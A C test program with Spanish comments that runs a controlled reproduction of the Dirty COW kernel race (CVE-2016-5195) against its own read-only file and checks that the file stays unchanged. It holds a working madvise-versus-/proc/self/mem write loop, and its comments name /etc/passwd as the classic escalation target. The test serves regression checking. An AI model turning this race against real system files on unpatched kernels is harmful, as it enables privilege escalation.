/**
 * @file test_race.c
 * @brief PoC CONTROLADA del patron de carrera Dirty COW (CVE-2016-5195) y de la
 *        carrera madvise(MADV_DONTNEED) vs. escritura (pregunta 9).
 *
 * El patron original:
 *   Hilo A: madvise(map, MADV_DONTNEED)    -> descarta la copia COW privada
 *   Hilo B: pwrite(/proc/self/mem, map)    -> escritura "forzada" (FOLL_FORCE)
 *   En kernels < 4.8.3, B podia terminar escribiendo en la pagina ORIGINAL del
 *   Page Cache (archivo de solo lectura, p.ej. /etc/passwd) => escalada.
 *
 * Esta prueba NO ataca archivos del sistema: usa un archivo propio con permisos
 * 0444, lo abre O_RDONLY y verifica al final que su contenido NO cambio. En un
 * kernel corregido el resultado esperado es "INTEGRO".
 *
 * Uso: ./test_race [dir] [segundos]
 */
#include "common.h"
#include <pthread.h>
#include <stdatomic.h>

static char *g_map;
static long g_pg;
static atomic_int g_stop;
static atomic_long g_madv, g_writes, g_write_ok;
static int g_memfd;

static void *th_madvise(void *a)
{
	(void)a;
	while (!atomic_load(&g_stop)) {
		madvise(g_map, g_pg, MADV_DONTNEED);
		atomic_fetch_add(&g_madv, 1);
	}
	return NULL;
}

static void *th_procmem(void *a)
{
	const char *payload = "PWNED-PWNED-PWNED";

	(void)a;
	while (!atomic_load(&g_stop)) {
		if (pwrite(g_memfd, payload, strlen(payload), (off_t)(uintptr_t)g_map) > 0)
			atomic_fetch_add(&g_write_ok, 1);
		atomic_fetch_add(&g_writes, 1);
	}
	return NULL;
}

/* Variante 2: escritura directa en un MAP_PRIVATE escribible vs MADV_DONTNEED */
static void *th_direct_write(void *a)
{
	(void)a;
	while (!atomic_load(&g_stop)) {
		memcpy(g_map, "PRIVATE-WRITE", 13);
		atomic_fetch_add(&g_writes, 1);
	}
	return NULL;
}

static int run(const char *path, int secs, int variant)
{
	pthread_t a, b;
	char buf[128];
	int fd = open(path, O_RDONLY);
	int prot = variant == 1 ? PROT_READ : PROT_READ | PROT_WRITE;

	g_map = mmap(NULL, g_pg, prot, MAP_PRIVATE, fd, 0);
	if (g_map == MAP_FAILED) {
		perror("mmap");
		return -1;
	}
	g_memfd = open("/proc/self/mem", O_RDWR);
	atomic_store(&g_stop, 0);
	atomic_store(&g_madv, 0);
	atomic_store(&g_writes, 0);
	atomic_store(&g_write_ok, 0);
	pthread_create(&a, NULL, th_madvise, NULL);
	pthread_create(&b, NULL, variant == 1 ? th_procmem : th_direct_write, NULL);
	sleep(secs);
	atomic_store(&g_stop, 1);
	pthread_join(a, NULL);
	pthread_join(b, NULL);
	if (variant == 1)
		INFO("madvise(DONTNEED)=%ld  pwrite(/proc/self/mem)=%ld  (aceptadas por el kernel=%ld)",
		     atomic_load(&g_madv), atomic_load(&g_writes), atomic_load(&g_write_ok));
	else
		INFO("madvise(DONTNEED)=%ld  escrituras directas en el mapeo=%ld",
		     atomic_load(&g_madv), atomic_load(&g_writes));
	munmap(g_map, g_pg);
	close(g_memfd);
	close(fd);

	/* Releer desde el Page Cache / disco */
	slurp(path, buf, sizeof(buf));
	return strncmp(buf, "SOLO-LECTURA", 12) == 0;
}

int main(int argc, char **argv)
{
	const char *dir = argc > 1 ? argv[1] : "/tmp/mmguard_test";
	int secs = argc > 2 ? atoi(argv[2]) : 3;
	char path[300];

	g_pg = sysconf(_SC_PAGESIZE);
	mkdir(dir, 0755);
	snprintf(path, sizeof(path), "%s/solo_lectura.txt", dir);
	chmod(path, 0644);
	make_file(path, "SOLO-LECTURA: contenido que nadie debe poder alterar\n", 0444);

	SECTION("Variante 1: Dirty COW (MADV_DONTNEED vs escritura FOLL_FORCE por /proc/self/mem)");
	CHECK(run(path, secs, 1) == 1, "archivo O_RDONLY/0444 INTEGRO tras %d s de carrera", secs);

	SECTION("Variante 2: MADV_DONTNEED vs escritura directa en MAP_PRIVATE (pregunta 9)");
	CHECK(run(path, secs, 2) == 1, "archivo INTEGRO: las escrituras solo tocan copias COW anonimas");
	INFO("tras cada DONTNEED la PTE se vacia y el siguiente acceso re-lee la pagina original");
	return finish("test_race");
}
